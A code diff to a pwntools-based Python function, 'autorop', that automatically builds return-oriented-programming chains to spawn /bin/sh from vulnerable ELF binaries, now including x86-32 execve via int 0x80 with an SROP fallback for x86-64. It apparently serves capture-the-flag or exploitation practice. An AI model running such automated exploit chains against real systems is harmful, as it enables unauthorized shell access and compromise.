@@ -390,11 +390,14 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
     except Exception as e:
         return {"ok": False, "note": f"no carga: {e}"}
     binsh = next(elf.search(b"/bin/sh\x00"), None)
+    is32 = getattr(elf, "bits", 64) == 32          # x86-32: cdecl, execve=11, int 0x80, SROP distinto
     rop = ROP(elf)
     built = False
     strategy = ""
     if binsh is not None:
-        # 1) ret2libc system('/bin/sh') if system is available (dynamic or static-with-system)
+        # 1) ret2libc system('/bin/sh') if system is available (dynamic or static-with-system).
+        #    ARCH-AGNOSTICO: rop.call() coloca el arg en el registro (x64) o en la pila (x86-32 cdecl)
+        #    segun el contexto del ELF. Verificado en sandbox con ret2win32 (x86-32): shell real.
         try:
             sysaddr = elf.plt.get("system") or (elf.symbols or {}).get("system")
             if sysaddr:
@@ -405,14 +408,22 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
                 rop.call(sysaddr, [binsh]); built = True; strategy = "ret2libc system"
         except Exception:
             pass
-        # 2) explicit execve syscall chain (robust; avoids pwntools SROP)
+        # 2) explicit execve syscall chain. ARCH-AWARE: en x86-32 es eax=11/ebx/ecx/edx + `int 0x80`;
+        #    en x86-64 es rax=0x3b/rdi/rsi/rdx + `syscall`. Antes esta rama fijaba SIEMPRE rax/rdi
+        #    (64-bit) con execve=0x3b aunque el binario fuese de 32 bits -> cadena incorrecta.
         if not built:
             try:
-                rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
-                sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+                if is32:
+                    rop.eax = 0x0b; rop.ebx = binsh; rop.ecx = 0; rop.edx = 0
+                    sc = rop.find_gadget(["int 0x80"])
+                else:
+                    rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
+                    sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
                 if sc:
                     rop.raw(sc.address)
-                    built = True; strategy = "execve syscall (gadgets)"
+                    built = True
+                    strategy = ("execve int0x80 (gadgets, x86-32)" if is32
+                                else "execve syscall (gadgets)")
             except Exception:
                 pass
     # 3) Let pwntools build execve('/bin/sh'), STAGING the string into writable memory when the
@@ -434,7 +445,7 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
     # 4) explicit SROP fallback: a fake sigcontext (rt_sigreturn, RAX=15) sets ALL registers at
     #    once, so it needs only `pop rax; ret` + a syscall gadget -- no pop rdi/rsi/rdx. Used when
     #    the execve chain can't satisfy the arg registers. Needs an in-memory "/bin/sh" (binsh).
-    if not built and binsh is not None:
+    if not built and binsh is not None and not is32:   # SROP aqui es x86-64 (frame.rax/rdi/rsi/rdx)
         try:
             from pwn import SigreturnFrame
             rop = ROP(elf)
